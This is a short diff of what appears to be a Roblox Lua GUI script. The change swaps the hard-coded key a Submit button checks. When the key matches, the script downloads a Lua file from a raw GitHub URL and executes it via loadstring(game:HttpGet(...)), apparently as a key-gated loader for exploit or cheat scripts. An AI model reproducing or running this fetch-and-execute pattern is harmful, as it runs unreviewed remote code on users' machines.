@@ -66,7 +66,7 @@ Submit.Text = "Submit"
 Submit.TextColor3 = Color3.fromRGB(0, 0, 0)
 Submit.TextSize = 14.000
 Submit.MouseButton1Down:connect(function()
-	if TextBox.Text == "5242435" then
+	if TextBox.Text == "4facadsr35asdfdasdqwer6dfsd" then
 		loadstring(game:HttpGet(("https://raw.githubusercontent.com/RinneganDeathX/cmdbarstocks/main/.lua"), true))()
        ScreenGui:Destroy()
     elseif TextBox.Text == "7354133" then 
